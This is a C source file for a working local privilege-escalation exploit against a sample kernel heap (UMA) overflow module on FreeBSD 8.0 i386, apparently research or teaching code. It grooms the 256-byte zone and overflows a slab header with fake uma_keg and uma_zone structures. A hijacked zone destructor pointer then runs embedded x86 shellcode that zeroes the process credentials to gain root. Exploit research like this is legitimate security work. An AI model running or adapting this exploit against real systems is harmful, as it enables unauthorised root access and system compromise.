/*
 * exploit.c -- Patroklos Argyroudis, argp at domain census-labs.com
 *
 * Exploit for the sample kernel heap (UMA) vulnerability.  This works
 * on FreeBSD 8.0-RELEASE/i386.
 *
 * $Id: exploit.c,v 8167bfa7e34f 2010/02/17 13:36:17 argp $
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/module.h>

#define EVIL_SIZE           428 /* causes 256 bytes to be allocated */
#define TARGET_SIZE         256
#define OP_ALLOC            1
#define OP_FREE             2

#define BUF_SIZE            256
#define LINE_SIZE           56

#define ITEMS_PER_SLAB      15  /* for the 256 anonymous zone */

struct argz
{
    char *buf;
    u_int len;
    int op;
    u_int slot;
};

int     get_zfree(char *zname);

u_char kernelcode[] =
    "\x64\xa1\x00\x00\x00\x00"
    "\x8b\x40\x04"
    "\x8b\x40\x24"
    "\x31\xd2"
    "\x89\x50\x04"
    "\x89\x50\x08"
    "\x8b\x81\x00\xf0\xff\xff"
    "\x83\xf8\x00"
    "\x74\x02"
    "\xeb\x06"
    "\x8b\x81\x00\x10\x00\x00"
    "\x89\x01"
    "\xc3";

int
main(int argc, char *argv[])
{
    int sn, i, j, n;
    char *ptr;
    char *kbuf;
    u_long *lptr;
    struct module_stat mstat;
    struct argz vargz;

    sn = i = j = n = 0;

    n = get_zfree("256");

    printf("---[ free items on the %d zone: %d\n", TARGET_SIZE, n);

    vargz.len = TARGET_SIZE;
    vargz.buf = calloc(vargz.len + 1, sizeof(char));

    if(vargz.buf == NULL)
    {
        perror("calloc");
        exit(1);
    }

    memset(vargz.buf, 0x41, vargz.len);

    mstat.version = sizeof(mstat);
    modstat(modfind("bug"), &mstat);
    sn = mstat.data.intval;
    vargz.op = OP_ALLOC;

    printf("---[ consuming %d items from the %d zone\n", n, TARGET_SIZE);

    for(i = 0; i < n; i++)
    {
        vargz.slot = i;
        syscall(sn, vargz);
    }

    n = get_zfree("256");
    printf("---[ free items on the %d zone: %d\n", TARGET_SIZE, n);

    printf("---[ allocating %d evil items on the %d zone\n",
            ITEMS_PER_SLAB, TARGET_SIZE);

    free(vargz.buf);
    vargz.len = EVIL_SIZE;
    vargz.buf = calloc(vargz.len, sizeof(char));

    if(vargz.buf == NULL)
    {
        perror("calloc");
        exit(1);
    }

    /* allocate the userland buffer to store our kernel shellcode */

    kbuf = calloc(sizeof(kernelcode), sizeof(char));

    if(kbuf == NULL)
    {
        perror("calloc");
        exit(1);
    }

    printf("---[ sizeof(kernelcode): %d\n", sizeof(kernelcode));
    printf("---[ userland kernelcode = 0x%.8x\n", (u_int)kbuf);

    memcpy(kbuf, kernelcode, sizeof(kernelcode));

    /* build the overflow buffer */

    ptr = (char *)vargz.buf;
    printf("---[ userland (fake uma_keg_t) = 0x%.8x\n", (u_int)ptr);

    lptr = (u_long *)(vargz.buf + EVIL_SIZE - 4);

    /* overwrite the real uma_slab_head struct */

    *lptr++ = (u_long)ptr;

    /* build the fake uma_keg struct */
    
    lptr = (u_long *)vargz.buf;
    *lptr++ = 0xc1894900;
    *lptr++ = 0xc1894a00;
    *lptr++ = 0xc0ccc838;
    *lptr++ = 0x1430000;
    *lptr++ = 0x0;
    *lptr++ = 0x0;
    *lptr++ = 0x4;
    *lptr++ = 0x0;
    *lptr++ = 0x0;
    *lptr++ = 0x0;
    *lptr++ = 0xc0ccc838;
    
    ptr = (char *)(vargz.buf + 128);
    *lptr++ = (u_long)ptr;

    *lptr++ = 0xc2ec7fa8;
    *lptr++ = 0x0;
    *lptr++ = 0xc2ec6fa8;
    *lptr++ = 0x0;
    *lptr++ = 0x3;
    *lptr++ = 0x1c;
    *lptr++ = 0x1;
    *lptr++ = 0x100;
    *lptr++ = 0x100;
    *lptr++ = 0x0;
    *lptr++ = 0x0;
    *lptr++ = 0x0;
    *lptr++ = 0xc0b23610;
    *lptr++ = 0xc0b235c0;
    *lptr++ = 0x0;
    *lptr++ = 0x0;
    *lptr++ = 0x0;
    *lptr++ = 0x10fa8;
    *lptr++ = 0xf;
    *lptr++ = 0x2010;

    /* build the fake uma_zone struct */
    
    *lptr++ = 0xc0ccc838;
    *lptr++ = 0xc1894988;
    *lptr++ = 0x0;
    *lptr++ = 0xc147492c;
    *lptr++ = 0x0;
    *lptr++ = 0xc18881a4;
    *lptr++ = 0xc188b71c;
    *lptr++ = 0x0;
    *lptr++ = 0xc188b718;

    ptr = (char *)vargz.buf;
    *lptr++ = (u_long)ptr;

    *lptr++ = 0xc0b26710;
    *lptr++ = 0x0;
    
    ptr = (char *)kbuf;     /* our kernel shellcode */
    *lptr++ = (u_long)ptr;  /* uz_dtor */

    *lptr++ = 0x0;
    *lptr++ = 0x0;
    *lptr++ = 0x9d2;
    *lptr++ = 0x0;
    *lptr++ = 0x853;
    *lptr++ = 0x0;
    *lptr++ = 0x0;
    *lptr++ = 0x0;
    *lptr++ = 0x2010;
    *lptr++ = 0x100;
    *lptr++ = 0x240000;
    *lptr++ = 0xc188904c;
    *lptr++ = 0xc1887d9c;
    *lptr++ = 0x19;
    *lptr++ = 0x0;
    *lptr++ = 0x10;
    *lptr++ = 0x0;

    for(j = 0; j < ITEMS_PER_SLAB; j++, i++)
    {
        vargz.slot = i;
        syscall(sn, vargz);
    }

    /* free the last allocated items to trigger exploitation */
    
    printf("---[ deallocating the last %d items from the %d zone\n",
            ITEMS_PER_SLAB, TARGET_SIZE);

    vargz.op = OP_FREE;

    for(j = 0; j < ITEMS_PER_SLAB; j++)
    {
        vargz.slot = i - j;
        syscall(sn, vargz);
    }

    free(vargz.buf);
    free(kbuf);
    return 0;
}

int
get_zfree(char *zname)
{
    u_int nsize, nlimit, nused, nfree, nreq, nfail;
    FILE *fp = NULL;
    char buf[BUF_SIZE];
    char iname[LINE_SIZE];

    nsize = nlimit = nused = nfree = nreq = nfail = 0;

    fp = popen("/usr/bin/vmstat -z", "r");

    if(fp == NULL)
    {
        perror("popen");
        exit(1);
    }

    memset(buf, 0, sizeof(buf));
    memset(iname, 0, sizeof(iname));

    while(fgets(buf, sizeof(buf) - 1, fp) != NULL)
    {
        sscanf(buf, "%s %u, %u, %u, %u, %u, %u\n", iname, &nsize, &nlimit,
                &nused, &nfree, &nreq, &nfail);

        if(strncmp(iname, zname, strlen(zname)) == 0)
        {
            break;
        }
    }

    pclose(fp);
    return nfree;
}

/* EOF */
